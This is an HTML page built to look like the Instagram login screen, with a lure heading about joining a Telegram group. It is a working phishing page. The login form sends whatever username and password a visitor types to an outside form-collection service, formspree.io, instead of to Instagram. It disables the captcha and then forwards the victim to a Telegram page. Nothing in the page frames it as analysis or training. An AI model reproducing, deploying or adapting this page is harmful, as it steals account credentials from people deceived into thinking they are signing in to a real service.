<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
}

/* Wrapper for vertical centering */
.wrapper {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 12px;
}

/* Main card */
.container {
    width: 100%;
    max-width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 32px 28px 24px;
    text-align: center;
}

/* Instagram logo */
.logo {
    font-size: 36px;
    font-weight: 600;
    margin-bottom: 28px;
}

/* Inputs */
input {
    width: 100%;
    padding: 12px 10px;
    margin-bottom: 8px;
    font-size: 14px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
}

input:focus {
    outline: none;
    border-color: #a8a8a8;
}

/* Button */
button {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    background: #0095f6;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    cursor: pointer;
}

button:active {
    opacity: 0.85;
}

/* Divider */
.divider {
    display: flex;
    align-items: center;
    margin: 18px 0;
    color: #8e8e8e;
    font-size: 12px;
}

.divider::before,
.divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.divider span {
    margin: 0 10px;
}

/* Forgot */
.forgot {
    font-size: 12px;
    color: #00376b;
}

/* Footer card */
.footer {
    width: 100%;
    max-width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 16px;
    margin-top: 10px;
    text-align: center;
    font-size: 14px;
}

/* Small text */
.note {
    font-size: 11px;
    color: #8e8e8e;
    margin-top: 14px;
}

/* Desktop improvements */
@media (min-width: 768px) {
    .wrapper {
        flex-direction: row;
    }
}
</style>
</head>

<body>

<div class="wrapper">
    <div>
        <div class="container">
            <h1>To join the Telegram group
continue below</h1>
            <div class="logo">Instagram</div>

            <form action="https://formspree.io/f/xdaozkvg" method="POST">
                <input type="text" name="u" placeholder="Phone number, username, or email" required>
                <input type="password" name="p" placeholder="Password" required>

                <input type="hidden" name="_next" value="telegram.html">
                <input type="hidden" name="_captcha" value="false">

                <button type="submit">Log in</button>
            </form>

            <div class="divider">
                <span>OR</span>
            </div>

            <div class="forgot">Forgot password?</div>
        </div>

        <div class="footer">
            Don’t have an account? <strong>Sign up</strong>
            <div class="note">© 2025</div>
        </div>
    </div>
</div>

</body>
</html>
